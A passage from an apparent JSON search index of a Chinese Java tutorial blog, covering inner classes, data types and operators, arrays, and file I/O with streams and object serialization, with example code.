instanceof 运算符判断； 无论向上转型还是向下转型，程序编译时检查的是左边，运行看右边。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/","title":"Java学习之路——面向对象入门"},{"content":"Java学习之路——内部类 概述 在Java中，可以将一个类定义在另一个类里面或者一个方法里面，这样的类称为内部类。\n广泛意义上的内部类一般来说包括这四种：成员内部类、局部内部类、匿名内部类和静态内部类。\n一、成员内部类 在类A中定义一个B类，那么A类就叫外部类，而B类就叫做成员内部类。\n成员内部类可以无条件访问外部类的所有成员属性和成员方法（包括private成员和静态成员），但是外部类想访问成员内部类的成员就必须先创建一个成员内部类的对象，再通过指向这个对象的引用来访问内部类的属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class Demo { public static void main(String[] args) { A a1 = new A(); a1.testA(); } } class A { private int x = 0; // 内部类B class B { int y=1; // 访问外部类的属性 public void testB() { System.out.println(x); } } public void testA() { B b1 = new B(); b1.testB(); // 访问内部类的属性 System.out.println(b1.y); } } 当成员内部类拥有和外部类同名的成员变量或者方法时，会发生隐藏现象，即默认情况下访问的是成员内部类的成员。如果要访问外部类的同名成员，需要以下面的形式进行访问：\n1 2 外部类.this.成员变量 外部类.this.成员方法 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class Demo { public static void main(String[] args) { A a1 = new A(); a1.testA(); } } class A { String name = \u0026#34;外部类\u0026#34;; // 内部类B class B { String name = \u0026#34;内部类\u0026#34;; // 访问外部类的属性 public void test() { System.out.println(name); System.out.println(A.this.name); } } void testA() { B b1 = new B(); b1.test(); } } 成员内部类是依附外部类而存在的，也就是说，如果要创建成员内部类的对象，前提是必须存在一个外部类的对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class Demo { public static void main(String[] args) { // 初始化一个 A 对象 A a1 = new A(); // 方式1 A.B b1 = a1.new B(); // 方式2 A.B b2 = a1.getBInstance(); } } class A { private B b = null; public B getBInstance() { if(b == null) b = new B(); return b; } // 内部类B class B { String name = \u0026#34;内部类\u0026#34;; } } 二、局部内部类 局部内部类是定义在一个方法或者一个作用域里面的类。局部内部类的访问仅限于方法内或者该作用域内。\n局部内部类和局部变量类似，不能有 public、protected、private 以及 static 修饰符。\n1 2 3 4 5 6 7 8 9 10 public class Demo { public static void main(String[] args) { class A { String name = \u0026#34;局部内部类\u0026#34;; } A a1 = new A(); System.out.println(a1.name); } } 三、匿名内部类 只要一个类是抽象的或是一个接口，那么其子类中的方法都可以使用匿名内部类来实现。\n匿名内部类是唯一一种没有构造器的类。因为其没有构造器，因此匿名内部类的使用范围是有限的。一般来说，匿名内部类用于继承其他类或是实现接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Demo { public static void main(String[] args) { Person p = new Person() { public void run() { System.out.println(\u0026#34;Eating\u0026#34;); } }; p.run(); } } abstract class Person { public abstract void run(); } 四、静态内部类 静态内部类也是定义在另一个类里面的类，这个类是一个静态类，不需要依靠外部类的实例化来进行调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Demo { public static void main(String[] args) { A.B b1 = new A.B(); b1.testB(); } } class A { // 内部类B static class B { String name = \u0026#34;静态内部类\u0026#34;; // 访问外部类的属性 public void testB() { System.out.println(name); } } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%86%85%E9%83%A8%E7%B1%BB/","title":"Java学习之路——内部类"},{"content":"Java学习之路——数据类型 一、数据类型分类 二、基本数据类型 数据类型 大小（单位：bit/位） 所属包装类 取值范围 byte 1 byte = 8 bit java.lang.Byte -128 ~ +127 short 2 byte = 16 bit java.langShort -32768 ~ +32767 int 4 byte = 32 bit java.lang.Integer -2^31 ~ +2^31-1 long 8 byte = 64 bit java.lang.Long -2^63 ~ +2^63-1 float 4 byte = 32 bit java.lang.Float -3.4 * 10^38 ~ +3.4 * 10^38 double 8 byte = 64 bit java.lang.Double -1.7 * 10^308 ~ +1.7 * 10^308 char 2 byte = 16 bit java.lang.Character 0 ~ 65535 boolean 4 byte = 32 bit (JVM 规范中 boolean 变量作为 int 处理) java.lang.Boolean 只有\u0026quot;true\u0026quot;和\u0026quot;false\u0026quot;两个取值 ## 三、引用数据类型 1. 类（class） 类具备某些共同特征的实体的集合，它是一种抽象的数据类型，它是对所具有相同特征实体的抽象。\n**注：**字符串实际上是一个类，因此字符串不属于基本数据类型！\n实现：\n1 class Demo {} 2. 接口（interface） 接口就是一个规范，是某个事物对外提供的一些功能的说明。\n实现：\n1 interface Demo {} 3. 数组（Array） 数组是用于储存多个相同类型数据的集合\n实现：\n1 int[] array = {0,1,2}; 四、类型转换 八种基本数据类型，除了布尔型，其它类型之间都可以互相转换。\n1. 自动类型转换 Java 程序中，小容量的数据类型可以自动向大容量的数据类型转换。\n转换顺序：\ngraph LR byte --\u0026gt; short short --\u0026gt; int char --\u0026gt; int int --\u0026gt; long long --\u0026gt; float float --\u0026gt; double 多种数据类型混合参与计算时，Java 程序会先将所有变量转换为最大的数据类型再进行运算。\n例如：\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { byte a = 10; char b = \u0026#39;A\u0026#39;; // Ascii码值为65 int c = 100; System.out.println(a + b + c); // 175 } } 在上面这个例子中，三种类型的数据进行加运算。由于在这三种类型中，int 类型为容量最大的类型，因此编译器会先将三种类型的数据转换为int类型的数据，再进行加法运算。因此输出的值为175。\n2. 强制类型转换 将大容量的数据类型转换为小容量的数据类型的操作称为强制类型转换。\n想要进行强制类型转换，需要加强制类型转换符程序才能编译通过。\n从大容量的数字转换为小容量的数据类型，转换后的值可能会发生改变，因此需要谨慎使用！\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { double a = 10.1; int b; b = (int)a; System.out.println(b); // 10 } } 将 double型数据转换为 int型数据，因为 int类型没有小数，因此转换过程中小数部分被丢弃。所有输出结果为10。\n五、运算符 1. 算术运算符 操作符 描述 + 加法 - 相加运算符两侧的值 - 减法 - 左操作数减去右操作数 * 乘法 - 相乘操作符两侧的值 / 除法 - 左操作数除以右操作数 ％ 取余 - 左操作数除以右操作数的余数 ++ 自增: 操作数的值增加1 \u0026ndash; 自减: 操作数的值减少1 注：i++ 与 ++i 存在一定的区别：\n++i 返回执行加一操作之后的值，i++ 返回执行加一操之前的值 若 i 是内置的数值类型，两者执行效率一样；若i是一些自定义的类 ++i 的效率 大于 i++的效率 2. 关系运算符 运算符 描述 == 检查如果两个操作数的值是否相等，如果相等则条件为真 != 检查如果两个操作数的值是否相等，如果值不相等则条件为真 \u0026gt; 检查左操作数的值是否大于右操作数的值，如果是那么条件为真 \u0026lt; 检查左操作数的值是否小于右操作数的值，如果是那么条件为真 \u0026gt;= 检查左操作数的值是否大于或等于右操作数的值，如果是那么条件为真 \u0026lt;= 检查左操作数的值是否小于或等于右操作数的值，如果是那么条件为真 3. 位运算符 操作符 描述 ＆ 如果相对应位都是1，则结果为1，否则为0 | 如果相对应位都是 0，则结果为 0，否则为 1 ^ 如果相对应位值相同，则结果为0，否则为1 〜 按位取反运算符翻转操作数的每一位，即0变成1，1变成0 \u0026laquo; 按位左移运算符。左操作数按位左移右操作数指定的位数 \u0026raquo; 按位右移运算符。左操作数按位右移右操作数指定的位数 \u0026raquo;\u0026gt; 按位右移补零操作符。左操作数的值按右操作数指定的位数右移，移动得到的空位以零填充 4. 逻辑运算符 操作符 描述 \u0026amp;\u0026amp; 称为逻辑与运算符。当且仅当两个操作数都为真，条件才为真 | | 称为逻辑或操作符。如果任何两个操作数任何一个为真，条件为真 ！ 称为逻辑非运算符。用来反转操作数的逻辑状态。如果条件为true，则逻辑非运算符将得到false 5. 赋值运算符 操作符 描述 = 简单的赋值运算符，将右操作数的值赋给左侧操作数 + = 加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数 - = 减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数 * = 乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数 / = 除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数 （％）= 取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数 \u0026laquo; = 左移位赋值运算符 \u0026raquo; = 右移位赋值运算符 ＆= 按位与赋值运算符 ^ = 按位异或赋值操作符 | = 按位或赋值操作符 6. 条件运算符 表达式：\n1 variable x = (expression) ? value if true : value if false 例子：\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { int a = 10, b; // 如果 a 等于 1 成立，则设置 b 为 20，否则为 30 b = (a \u0026gt; 1) ? 20 : 30; System.out.println( \u0026#34;Value of b is : \u0026#34; + b ); // Value of b is : 20 } } 7. instanceof 运算符 表达式：\n1 ( Object reference variable ) instanceof (class/interface type) 例子：\n1 2 3 4 5 6 7 8 public class Demo { public static void main(String[] args) { String name = \u0026#34;James\u0026#34;; // 由于 name 是 String 类型，所以返回真 System.out.println(name instanceof String); // true } } 8. 运算符优先级 类别 操作符 关联性 后缀 () 、[]、 . (点操作符) 左到右 一元 expr++、expr\u0026ndash; 从左到右 一元 ++expr、\u0026ndash;expr、+、-、～、！ 从右到左 乘性 *、/、％ 左到右 加性 +、- 左到右 移位 \u0026raquo;、\u0026raquo;\u0026gt; 、\u0026laquo; 左到右 关系 \u0026gt;、\u0026gt;=、\u0026lt;、\u0026lt;= 左到右 相等 ==、!= 左到右 按位与 ＆ 左到右 按位异或 ^ 左到右 按位或 | 左到右 逻辑与 \u0026amp;\u0026amp; 左到右 逻辑或 | | 左到右 条件 ？： 从右到左 赋值 =、+=、-=、*=、/=、％=、\u0026raquo;=、\u0026laquo;=、＆=、^=、|= 从右到左 逗号 ， 左到右 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","title":"Java学习之路——数据类型"},{"content":"Java学习之路——数组 一、数组概述 数组（Array）是有序的元素序列。数组是在程序设计中，把具有相同类型的若干元素按有序的形式组织起来的一种形式。 这些有序排列的同类数据元素的集合称为数组；\n数组本身是引用类型，数组中的元素可以是任意类型的（包括基本数据类型和引用数据类型）；\n数组的长度一旦确定就不能改变；\n可以通过索引的方式访问数组元素。\n二、初始化数组 1. 静态初始化 1 2 3 4 5 public class Demo { public static void main(String[] args) { int[] arr = new int[]{1001, 1002, 1003};; // 数组的声明和赋值同时进行 } } 2. 动态初始化 1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { int[] arr = new int[3]; // 数组的声明和赋值分开进行，动态初始化时声明传递数组长度 arr[0] = 1001; arr[1] = 1002; arr[2] = 1003; } } 三、数组元素的遍历 1. 索引 可以直接通过索引的方式访问每一个数组元素，但是当数组长度较大时重复性工作太多。\n1 2 3 4 5 6 7 8 9 10 public class Demo { public static void main(String[] args) { int[] arr = new int[]{1001, 1002, 1003, 1004}; // 声明一个数组变量 System.out.println(arr[0]); System.out.println(arr[1]); System.out.println(arr[2]); System.out.println(arr[3]); } } 2. 循环+索引 1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { int[] arr = new int[]{1001, 1002, 1003, 1004}; // 声明一个数组变量 for (int i=0 ; i\u0026lt;arr.length ; i++) { System.out.println(arr[i]); } } } 3. for each 循环 1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { int[] arr = new int[]{1001, 1002, 1003, 1004}; // 声明一个数组变量 for (int i: arr) { System.out.println(i); } } } 4. Arrays.toString() 方法 1 2 3 4 5 6 7 8 9 import java.util.Arrays; public class Demo { public static void main(String[] args) { int[] arr = new int[]{1001, 1002, 1003, 1004}; // 声明一个数组变量 System.out.println(Arrays.toString(arr)); } } 四、数组初始值 数组在初始化时，数组内部会赋值一个初始值，不同类型的数组初始值不同：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.util.Arrays; public class Demo { public static void main(String[] args) { // 整型 byte[] arr1 = new byte[3]; short[] arr2 = new short[3]; int[] arr3 = new int[3]; long[] arr4 = new long[3]; // 浮点型 float[] arr5 = new float[3]; double[] arr6 = new double[3]; // 非数值型 char[] arr7 = new char[3]; boolean[] arr8 = new boolean[3]; // 字符串 String[] arr9 = new String[3]; System.out.println(Arrays.toString(arr1)); System.out.println(Arrays.toString(arr2)); System.out.println(Arrays.toString(arr3)); System.out.println(Arrays.toString(arr4)); System.out.println(Arrays.toString(arr5)); System.out.println(Arrays.toString(arr6)); System.out.println(Arrays.toString(arr7)); System.out.println(Arrays.toString(arr8)); System.out.println(Arrays.toString(arr9)); } } 结果：\n1 2 3 4 5 6 7 8 9 [0, 0, 0] [0, 0, 0] [0, 0, 0] [0, 0, 0] [0.0, 0.0, 0.0] [0.0, 0.0, 0.0] [ , , ] [false, false, false] [null, null, null] 由输出结果可以发现：\nbyte、short、int、long 这几个整型数组的初始值为 0 ； float、double 这几个浮点型数组的初始值为 0.0； char 型数组的初始值为 \u0026rsquo;\\u0000\u0026rsquo;（不是什么都没有）； boolean 型数组初始值为 false； String 型数组初始值为 null。 五、多维数组 1. 二维数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Demo { public static void main(String[] args) { // 初始化二维数组 int[][] arr = new int[3][]; // 两个方括号中第一个方括号中必须指定数组长度 arr[0] = new int[]{1001, 1002, 1003}; arr[1] = new int[]{1004, 1005}; arr[2] = new int[]{1006, 1007, 1008, 1009}; // 遍历二维数组 for(int i=0 ; i\u0026lt;arr.length ; i++) { for (int j=0; j\u0026lt;arr[i].length ; j++) { System.out.println(arr[i][j]); } } } } 2. 多维数组 由二维数组推广即可。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%95%B0%E7%BB%84/","title":"Java学习之路——数组"},{"content":"Java学习之路——文件操作 概述 在计算机系统中，文件是非常重要的存储方式。在著名的操作系统 Linux 则更是“一切皆文件”，因此会操作文件我们需要掌握的基础本领之一。\n一、java.io.File 类 Java的标准库java.io提供了File对象来操作文件和目录。\njava.io.File类用于描述文件系统中的一个文件或目录 该类可以：\n1、访问文件或目录的属性信息 2、访问一个目录中的所有子项 3、操作文件或目录（创建、删除） 但是，File 类不能访问文件的具体内容！例如读文件、写文件等操作就不能使用该类来完成。\n构造文件对象 File 类有以下几种构造器：\n通过给定的父抽象路径名和子路径名字符串构造文件对象； 1 File(File parent, String child); 通过将给定路径名字符串转换成抽象路径名来构造文件对象； 1 File(String pathname) 根据 parent 路径名字符串和 child 路径名字符串构造文件对象； 1 File(String parent, String child) 通过将给定的 file: URI 转换成一个抽象路径名来构造文件对象。 1 File(URI uri) 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.io.File; public class Demo { public static void main(String[] args) { String dirname = \u0026#34;/java\u0026#34;; File f1 = new File(dirname); if (f1.isDirectory()) { System.out.println(\u0026#34;Directory of \u0026#34; + dirname); String s[] = f1.list(); for (int i = 0; i \u0026lt; s.length; i++) { File f = new File(dirname + \u0026#34;/\u0026#34; + s[i]); if (f.isDirectory()) { System.out.println(s[i] + \u0026#34; is a directory\u0026#34;); } else { System.out.println(s[i] + \u0026#34; is a file\u0026#34;); } } } else { System.out.println(dirname + \u0026#34; is not a directory\u0026#34;); } } } 常用方法 方法 功能 getName() 返回由此抽象路径名表示的文件或目录的名称； getParent() 返回此抽象路径名的父路径名的路径名字符串，如果此路径名没有指定父目录，则返回 null； getParentFile() 返回此抽象路径名的父路径名的抽象路径名，如果此路径名没有指定父目录，则返回 null； getPath() 将此抽象路径名转换为一个路径名字符串； isAbsolute() 测试此抽象路径名是否为绝对路径名； getAbsolutePath() 返回抽象路径名的绝对路径名字符串； canRead() 测试应用程序是否可以读取此抽象路径名表示的文件； canWrite() 测试应用程序是否可以修改此抽象路径名表示的文件； exists() 测试此抽象路径名表示的文件或目录是否存在； isDirectory() 测试此抽象路径名表示的文件是否是一个目录； isFile() 测试此抽象路径名表示的文件是否是一个标准文件； lastModified() 返回此抽象路径名表示的文件最后一次被修改的时间； length() 返回由此抽象路径名表示的文件的长度； createNewFile() 当且仅当不存在具有此抽象路径名指定的名称的文件时，原子地创建由此抽象路径名指定的一个新的空文件； delete() 删除此抽象路径名表示的文件或目录； deleteOnExit() 在虚拟机终止时，请求删除此抽象路径名表示的文件或目录； list() 返回由此抽象路径名所表示的目录中的文件和目录的名称所组成字符串数组； list(FilenameFilter filter) 返回由包含在目录中的文件和目录的名称所组成的字符串数组，这一目录是通过满足指定过滤器的抽象路径名来表示的； listFiles() 返回一个抽象路径名数组，这些路径名表示此抽象路径名所表示目录中的文件； listFiles(FileFilter filter) 返回表示此抽象路径名所表示目录中的文件和目录的抽象路径名数组，这些路径名满足特定过滤器； mkdir() 创建此抽象路径名指定的目录； mkdirs() 创建此抽象路径名指定的目录，包括创建必需但不存在的父目录； renameTo(File dest) 重新命名此抽象路径名表示的文件； setLastModified(long time) 设置由此抽象路径名所指定的文件或目录的最后一次修改时间； setReadOnly() 标记此抽象路径名指定的文件或目录，以便只可对其进行读操作； createTempFile(String prefix, String suffix, File directory) 在指定目录中创建一个新的空文件，使用给定的前缀和后缀字符串生成其名称； createTempFile(String prefix, String suffix) 在默认临时文件目录中创建一个空文件，使用给定前缀和后缀生成其名称； compareTo(File pathname) 按字母顺序比较两个抽象路径名； compareTo(Object o) 按字母顺序比较抽象路径名与给定对象； equals(Object obj) 测试此抽象路径名与给定对象是否相等； toString() 返回此抽象路径名的路径名字符串。 二、java.io.RandomAccessFile 类 java.io.RandomAccessFile类用于读写文件数据。其基于指针对文件进行读写。\n由于是基于指针，以字节为单位的读写，其效率较低。\n创建 RandomAccessFile有两种方式：\n1：r：只读模式，仅仅对文件数据进行读取； 2：rw：读写模式，对文件数据可以编辑。 在计算机中，类似文件、网络端口这些资源，都是由操作系统统一管理的。\n应用程序在运行的过程中，如果打开了一个文件进行读写，完成后要及时地关闭，以便让操作系统把资源释放掉，否则，应用程序占用的资源会越来越多，不但白白占用内存，还会影响其他应用程序的运行。\n因此，我们需要用try ... finally来保证InputStream在无论是否发生IO错误的时候都能够正确地关闭。\n示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import java.io.IOException; import java.io.RandomAccessFile; public class Demo { public static void main(String[] args) throws IOException { RandomAccessFile raf = new RandomAccessFile(\u0026#34;demo.txt\u0026#34; , \u0026#34;rw\u0026#34;); try { /* * void write(int d) * 写入1个字节，写出的是该整数d对应的2进制中的低八位(一个字节8个位) * 00000001 */ int a = 1; raf.write(a); //硬盘中存的是二进制 如果文件已经存在，在首次运行时覆盖原有内容，后面的不覆盖 a = 98; raf.write(a); System.out.println(\u0026#34;写入硬盘完毕\u0026#34;); } finally { // 读写完毕后，关闭；防止内存泄漏 raf.close(); } } } 用try ... finally来编写上述代码会感觉比较复杂，更好的写法是利用Java 7引入的新的try(resource)的语法，只需要编写try语句，让编译器自动为我们关闭资源。\n示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.io.IOException; import java.io.RandomAccessFile; public class Demo { public static void main(String[] args) throws IOException { try (RandomAccessFile raf = new RandomAccessFile(\u0026#34;demo.txt\u0026#34; , \u0026#34;rw\u0026#34;)) { int a = 1; raf.write(a); a = 98; raf.write(a); System.out.println(\u0026#34;写入硬盘完毕\u0026#34;); } } } 常用方法 方法 功能 close() 关闭此随机访问文件流并释放与该流关联的所有系统资源 getChannel() 返回与此文件关联的唯一FileChannel对象，NIO用到 getFilePointer() 返回此文件中的当前偏移量 length() 返回此文件的长度 read() 从此文件中读取一个数据字节 read(byte[] b) 将最多 b.length 个数据字节从此文件读入byte数组，返回读入的总字节数，如果由于已经达到文件末尾而不再有数据，则返回-1。在至少一个输入字节可用前，此方法一直阻塞 read(byte[] b, int off, int length) 将最多 length 个数据字节从此文件的指定初始偏移量off读入byte数组 readBoolean() 从此文件读取一个boolean，与 readByte()、readChar()、readDouble()等类似 readLine() 从此文件读取文本的下一行 seek(long pos) 重要，设置到此文件开头测量到的文件指针偏移量，在该位置发生下一个读取或写入操作 skipBytes(int n) 重要，尝试跳过输入的n个字节以丢弃跳过的字节，返回跳过的字节数 write(byte[] b) 将 b.length 个字节从指定byte数组写入到此文件中 write(byte[] b, int off, int length) 将 length 个字节从指定byte数组写入到此文件，并从偏移量off处开始 write(int b) 向此文件写入指定的字节 writeBoolean(boolean v) 按单字节值将boolean写入该文件，与 writeByte(int v)、writeBytes(String s)、writeChar(int v)等方法类似 三、java.io.FileInputStream和java.io.FileOutputStream 输入流都有一个抽象父类：java.io.InputStream，他是所有字节输入流的父类。FileInputStream是InputStream的子类，是文件字节输入流，是一个低级流（节点流），其使用方式和RandomAccessFile一致。InputStream及其子类只负责读文件，不负责写文件。\n输出流都有一个抽象父类：java.io.OutputStream，他是所有字节输出流的父类。FileOutputStream是OutputStream的子类，是文件字节输出流，是一个低级流（节点流），其使用方式和RandomAccessFile一致。OutputStream及其子类只负责写文件，不负责读文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; public class Demo { public static void main(String[] args) throws IOException { try (FileInputStream fis = new FileInputStream(\u0026#34;demo.txt\u0026#34;); // 输入文件 FileOutputStream fos = new FileOutputStream(\u0026#34;demo-copy.txt\u0026#34; , true)) { // 输出文件 byte[] data = new byte[100]; int len = fis.read(data); // 读取输入文件 String inputData = new String(data , 0 , len); System.out.println(inputData); String outData = inputData + \u0026#34;-copy\u0026#34;; fos.write(outData.getBytes()); // 输出至文件 } } } 常用方法 序号 方法及描述 所属对象 close() 关闭此文件输入流并释放与此流有关的所有系统资源。抛出IOException异常。 通用 finalize() 这个方法清除与该文件的连接。确保在不再引用文件输入流时调用其 close 方法。抛出IOException异常。 通用 read(int r) 这个方法从 InputStream 对象读取指定字节的数据。返回为整数值。返回下一字节数据，如果已经到结尾则返回 -1。 FileInputStream read(byte[] r) 这个方法从输入流读取r.length长度的字节。返回读取的字节数。如果是文件结尾则返回-1。 FileInputStream available() 返回下一次对此输入流调用的方法可以不受阻塞地从此输入流读取的字节数。返回一个整数值。 FileInputStream write(int w) 这个方法把指定的字节写到输出流中。 FileOutputStream write(byte[] w) 把指定数组中 w.length 长度的字节写到OutputStream中。 FileOutputStream 四、java.io.BufferedInputStream和java.io.BufferedOutputStream BufferedInputStream和BufferedOutputStream是一对缓冲流，属于高级流（处理流），用于处理低级流（节点流）的数据，使用它们可以提高读写的效率（先将数据写入缓冲区，在写入硬盘，减少了读写次数）。缓冲流单独存在没意义，必须和低级流一起使用。\n文件复制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import java.io.*; public class Demo { public static void main(String[] args) throws IOException { FileInputStream fis = new FileInputStream(\u0026#34;demo.txt\u0026#34;); //低级输入流 BufferedInputStream bis = new BufferedInputStream(fis); //将低级输入流接到高级输入流上 FileOutputStream fos = new FileOutputStream(\u0026#34;demo-copy.txt\u0026#34;); //低级输出流 BufferedOutputStream bos = new BufferedOutputStream(fos); //将低级输出流接到高级输出流上​ try { int len = -1; /* * 缓冲流内部维护了一个缓冲区，当我们调用下面的read（）方法读取一个字节时， * 实际上缓冲流会让FileInputStream读取一组字节并存入到缓冲流自身内部的字节数组中，然后将第一个字节返回。 * 当我们再次调用read()方法读取一个字节时，缓冲流会直接将数组中的第二个字节返回，以此类推，直到该数组中所有字节都被读取 * 过后才会再次读取一组字节。所以实际上还是通过提高每次读取数据的数量减少读取的次数来提高读取效率。 */ while((len = bis.read()) != -1){ /* * 缓冲输出流也是类似的 */ bos.write(len); } System.out.println(\u0026#34;复制完成\u0026#34;); } finally { bis.close(); //只需要关高级流（内部会先关闭低级流） bos.close(); } } } 手动将缓存中的数据刷到磁盘 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.*; public class Demo { public static void main(String[] args) throws IOException { FileOutputStream fos = new FileOutputStream(\u0026#34;demo.txt\u0026#34;); try (BufferedOutputStream bos = new BufferedOutputStream(fos)) { /* * 通过缓冲输出流写出的字节不会立即被写入硬盘，会先存在内存的字节数组，直到该数组满了，才会一次性写出所有的数据。 * 这样做等同于提高了一次性的写入数据量，减少了写的次数，提高效率 */ bos.write(\u0026#34;手动将缓存中的数据刷到磁盘\u0026#34;.getBytes()); //不会及时写入硬盘，在内存中。如果不加colse()，最终被GC干掉，不会写入文件 /* * flush方法强制将缓冲区的数据一次性输出。提高了及时性，但是频繁操作会降低操作效率。 */ bos.flush();//强制及时写入内存，不会等到缓冲区满。 执行次数越多，效率越低 System.out.println(\u0026#34;完成\u0026#34;); } } } 五、java.io.ObjectInputStream和java.io.ObjectOutputStream ObjectInputStream和ObjectOutputStream是一对对象流，属于高级流，ObjectInputStream可以读取一组字节转化为 Java 对象，而ObjectOutputStream的作用是可以直接将 Java 中的一个对象转化为一组字节后输出。这其实就是 Java 对象的序列化和反序列化，因此Java 对象必须要实现序列化接口。\n1. 定义一个对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Person implements Serializable{ /** * 1.实现Serializable接口。该接口中没有方法，不需要重写方法，这样的接口也叫签名接口。 * * 2.需要有serialVersionUID,序列化的版本号（影响反序列化能否成功）。 * 当一个类实现了Serializable接口后，该类会有一个常量表示这个类的版本号，版本号影响这个对象反序列化的结果。 * 不显式定义serialVersionUID，会默认随机产生一个（根据类的结构由算法产生的，类只要改过，随机产生的就会变化） * 建议自行维护版本号（自定义该常量并给定值）。若不指定，编译器会根据当前类的结构产生一个版本号，类的结构不变则版本号不变，但是结构变了（属性类型、名字变化等），都会导致版本号改变。 * 序列化时，这个版本号会存入到文件中。 * 反序列化对象时，会检查该对象的版本号与当前类现在的版本号是否一致，一致则可以还原，不一致则反序列化失败。 * 版本号一致时，就算反序列化的对象与当前类的结构有出入，也会采取兼容模式，即：任然有的属性就进行还原，没有的属性则被忽略。 */ private static final long serialVersionUID = 1L; private String name; private int age; /* * 3.transient关键字的作用是修饰一个属性。那么当这个类的实例进行序列化时，该属性不会被包含在序列化后的字节中，从而达到了“瘦身”的目的 * 反序列化后是该类型的默认值。引用类型默认是null,其他类型默认是0。如果是静态变量，则映射为内存中的该变量的值。 */ private transient List\u0026lt;String\u0026gt; otherInfo; public void setName(String 诸葛小猿) { } public void setAge(int i) { } public void setOtherInfo(List\u0026lt;String\u0026gt; otherInfo) { } } 2. 对象序列化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; import java.util.ArrayList; import java.util.List; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { Person p = new Person(); p.setName(\u0026#34;ObjectOutputStream\u0026#34;); p.setAge(30); List\u0026lt;String\u0026gt; otherInfo = new ArrayList\u0026lt;String\u0026gt;(); otherInfo.add(\u0026#34;对象序列化\u0026#34;); p.setOtherInfo(otherInfo); System.out.println(p); FileOutputStream fos = new FileOutputStream(\u0026#34;demo.obj\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); /* * ObjectOutputStream的writeObject方法的作用：将给定的java对象转换为一组字节后写到硬盘上， * 这里由于ObjectOutputStream是装在FileOutputStream上的,所以转换的这组字节最终通过FOS写入到文件中。 * * 若希望该对象可以被写出，那么前提是该对象所属的类必须实现Serializable接口 * 实际数据写入文件的信息比对象本身信息多，因为保存了对象的结构信息 * * 该方法涉及到两个操作： * 1：将对象转换为一组字节（称为：对象序列化（编码）） * 2：将该字节写入到文件中（硬盘上）（称为：数据持久化） */ oos.writeObject(p); System.out.println(\u0026#34;成功\u0026#34;); oos.close(); } } 3. 对象反序列化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.*; import java.util.List; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(\u0026#34;demo.obj\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); /* * 将一组字节还原为对象的过程称为:对象的反序列化 * * 反序列化时，demo.obj文件中的serialVersionUID要和Person类中的serialVersionUID一致才能成功 * * readObject() 返回的是Object */ Person p = (Person) ois.readObject(); System.out.println(p); ois.close(); } } 六、java.io.InputStreamReader和java.io.OutputStreamWriter Java 